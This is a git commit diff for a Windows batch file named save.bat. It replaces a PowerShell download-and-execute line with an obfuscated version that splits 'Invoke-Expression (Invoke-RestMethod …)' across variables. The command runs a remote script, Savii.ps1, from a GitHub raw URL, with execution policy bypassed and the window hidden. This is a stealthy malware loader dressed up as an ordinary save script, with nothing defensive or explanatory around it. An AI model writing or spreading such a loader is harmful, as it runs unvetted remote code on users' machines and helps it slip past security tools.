8472843a5a5045a4d42cbf80ceeb2974bfde42cc
Caspur <casperautomob@gmail.com>
2026-08-06 22:19:36 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,6 +1,6 @@
 @echo off
-
-set "pscmd=Invoke-Expression (Invoke-RestMethod https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
-
-powershell -NoP -NoL -ep Bypass -Win 1 -Command "%pscmd%"
- 
+set "e1=Invoke-Expression"
+set "e2=(Invoke-RestMethod"
+set "e3=https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
+set "cmd=%e1% %e2% %e3%"
+powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
